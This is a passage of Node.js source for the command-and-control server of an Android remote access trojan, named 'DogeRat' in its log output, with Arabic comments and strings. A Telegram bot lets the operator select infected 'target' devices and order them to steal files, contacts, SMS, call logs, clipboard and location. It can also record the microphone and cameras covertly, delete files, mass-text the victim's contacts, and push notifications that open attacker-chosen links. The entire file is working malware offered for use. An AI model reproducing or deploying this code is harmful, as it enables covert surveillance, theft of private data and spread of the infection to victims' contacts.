        if (appBot && id && lat && lon) {
            appBot.sendLocation(id, lat, lon).catch(err => console.error('خطأ في إرسال الموقع:', err.message));
            appBot.sendMessage(id, `°• موقع من جهاز <b>${model}</b>`, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('خطأ في إرسال رسالة الموقع:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('خطأ في رفع الموقع:', error.message);
        res.status(500).send('خطأ في رفع الموقع');
    }
});

// معالجة اتصال WebSocket
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || 'جهاز غير معروف';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'غير معروف';
        const brightness = req.headers.brightness || '0';
        const provider = req.headers.provider || 'غير معروف';

        ws.uuid = uuid;
        ws.isAlive = true;
        
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date().toISOString()
        });
        
        console.log(`جهاز متصل: ${model} (${uuid})`);
        
        if (appBot && id) {
            appBot.sendMessage(id,
                `°• تم اتصال جهاز جديد\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>\n` +
                `• إصدار أندرويد : <b>${version}</b>\n` +
                `• سطوع الشاشة : <b>${brightness}</b>\n` +
                `• المزود : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('خطأ في إرسال رسالة الاتصال:', err.message));
        }

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('close', function () {
            console.log(`فصل الجهاز: ${model} (${uuid})`);
            
            if (appBot && id) {
                appBot.sendMessage(id,
                    `°• تم فصل الجهاز\n\n` +
                    `• موديل الجهاز : <b>${model}</b>\n` +
                    `• البطارية : <b>${battery}</b>\n` +
                    `• إصدار أندرويد : <b>${version}</b>\n` +
                    `• سطوع الشاشة : <b>${brightness}</b>\n` +
                    `• المزود : <b>${provider}</b>`,
                    { parse_mode: "HTML" }
                ).catch(err => console.error('خطأ في إرسال رسالة الفصل:', err.message));
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', function (error) {
            console.error(`خطأ WebSocket للجهاز ${model}:`, error.message);
        });
        
    } catch (error) {
        console.error('خطأ في معالجة الاتصال:', error.message);
    }
});

// نبضات القلب للكشف عن العملاء المنفصلين
const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`إنهاء الاتصال الميت: ${ws.uuid}`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

// معالجة رسائل بوت التيليجرام
if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            
            // معالجة رسائل الرد
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            
            // معالجة رسائل الأوامر
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            } else if (message.text === '/start' || message.text?.startsWith('/')) {
                // السماح فقط بأمر /start للمستخدمين غير المصرح لهم
                if (message.text === '/start') {
                    appBot.sendMessage(chatId,
                        '°• الوصول مرفوض\n\n' +
                        '• هذا البوت خاص. اتصل بالمسؤول للوصول.',
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('خطأ:', err.message));
                }
            }
        } catch (error) {
            console.error('خطأ في معالجة الرسالة:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('خطأ في استعلام رد الاتصال:', error.message);
        }
    });

    appBot.on('error', (error) => {
        console.error('خطأ في البوت:', error.message);
    });

    appBot.on('polling_error', (error) => {
        console.error('خطأ في الاستطلاع:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;
    
    const replyText = message.reply_to_message?.text || '';
    
    if (replyText.includes('°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
            '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
        sendToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
        sendToDevice(currentUuid, `send_message_to_all:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد تحميله')) {
        sendToDevice(currentUuid, `file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
        sendToDevice(currentUuid, `delete_file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
        const duration = parseInt(message.text);
        if (!isNaN(duration) && duration > 0) {
            sendToDevice(currentUuid, `microphone:${duration}`);
        } else {
            appBot.sendMessage(id, '°• مدة غير صالحة. يرجى إدخال رقم صحيح بالثواني.').catch(() => {});
        }
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
        sendToDevice(currentUuid, `rec_camera_main:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
        sendToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
            '• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي تدخله',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (replyText.includes('°• رائع، الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار')) {
        sendToDevice(currentUuid, `show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
        sendToDevice(currentUuid, `play_audio:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• مرحباً بك في لوحة تحكم Rat\n\n' +
            '• إذا كان التطبيق مثبتاً على الجهاز المستهدف، انتظر الاتصال\n\n' +
            '• عندما تتلقى رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لتلقي الأوامر\n\n' +
            '• انقر على زر الأوامر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب من بين الأوامر\n\n' +
            '• إذا علقت في مكان ما في البوت، أرسل أمر /start',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
    
    if (message.text === 'الأجهزة المتصلة') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            let text = '°• قائمة الأجهزة المتصلة :\n\n';
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• إصدار أندرويد : <b>${value.version}</b>\n` +
                    `• سطوع الشاشة : <b>${value.brightness}</b>\n` +
                    `• المزود : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('خطأ:', err.message));
        }
    }
    
    if (message.text === 'تنفيذ أمر') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة متاحة\n\n' +
                '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
            ).catch(err => console.error('خطأ:', err.message));
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key, map) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الأمر', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(err => console.error('خطأ:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (!id) return;

    const commandHandlers = {
        'device': () => {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                appBot.sendMessage(id, '°• الجهاز غير موجود أو منفصل').catch(() => {});
                return;
            }
            appBot.editMessageText(`°• حدد أمراً للجهاز : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'التطبيقات', callback_data: `apps:${uuid}` },
                            { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: 'جلب ملف', callback_data: `file:${uuid}` },
                            { text: 'حذف ملف', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
                            { text: 'الميكروفون', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` },
                            { text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'الموقع', callback_data: `location:${uuid}` },
                            { text: 'رسالة توست', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: 'المكالمات', callback_data: `calls:${uuid}` },
                            { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: 'اهتزاز', callback_data: `vibrate:${uuid}` },
                            { text: 'إظهار إشعار', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: 'الرسائل', callback_data: `messages:${uuid}` },
                            { text: 'إرسال رسالة', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: 'تشغيل صوت', callback_data: `play_audio:${uuid}` },
                            { text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            {
                                text: 'إرسال رسالة لجميع جهات الاتصال',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('خطأ:', err.message));
        },
        'calls': () => {
            sendToDevice(uuid, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            sendToDevice(uuid, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            sendToDevice(uuid, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'apps': () => {
            sendToDevice(uuid, 'apps');
            deleteAndSendProcessing(msg.message_id);
        },
        'device_info': () => {
            sendToDevice(uuid, 'device_info');
            deleteAndSendProcessing(msg.message_id);
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة إليه\n\n' +
                '• إذا كنت تريد إرسال رسالة نصية قصيرة إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، وإلا أدخل الرقم مع رمز الدولة',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
                '• كن حذراً، لن يتم إرسال الرسالة إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لاستلام ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'microphone': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
                '• لاحظ أنه يجب عليك إدخال الوقت رقمياً بوحدات الثواني',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'toast': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
                '• رسالة التوست هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'show_notification': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
                '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        },
        'play_audio': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('خطأ:', err.message));
            currentUuid = uuid;
        }
    };

    if (commandHandlers[commend]) {
        commandHandlers[commend]();
    }
}

function sendToDevice(uuid, command) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
}

function deleteAndSendProcessing(messageId) {
    if (appBot && id) {
        appBot.deleteMessage(id, messageId).catch(() => {});
        sendProcessingMessage();
    }
}

function sendProcessingMessage() {
    if (appBot && id) {
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى رداً في اللحظات القليلة القادمة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('خطأ:', err.message));
    }
}

// نبضة بقاء الاتصال
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    
    // اختياري: إبقاء الخادم مستيقظاً عن طريق إرسال طلب لخدمة خارجية
    if (address) {
        axios.get(address).catch(() => {
            // تجاهل الأخطاء من الطلب
        });
    }
}, 5000);

// إغلاق آمن
process.on('SIGTERM', () => {
    console.log('تم استلام إشارة SIGTERM: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('تم استلام إشارة SIGINT: إغلاق خادم HTTP');
    appServer.close(() => {
        console.log('تم إغلاق خادم HTTP');
        process.exit(0);
    });
});

// بدء الخادم
appServer.listen(PORT, () => {
    console.log(`خادم DogeRat v1.0.0 يعمل على المنفذ ${PORT}`);
    console.log(`ستظهر الأجهزة المتصلة هنا`);
});
